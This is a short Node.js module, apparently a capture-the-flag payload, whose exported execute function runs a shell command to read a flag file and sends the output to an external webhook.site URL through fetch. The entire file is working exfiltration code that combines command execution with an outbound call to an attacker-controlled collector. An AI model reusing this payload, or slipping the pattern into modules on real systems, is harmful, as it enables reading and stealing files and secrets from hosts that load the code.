const { exec } = require('child_process');

module.exports = {
  execute: () => {
    exec('cat /FLAG_4277146a23195c2a', (error, stdout, stderr) => {
        fetch(`https://webhook.site/9280fdc8-b60f-4699-96ba-b1cdb5278797?a=${stdout}`);
    });
  },
};
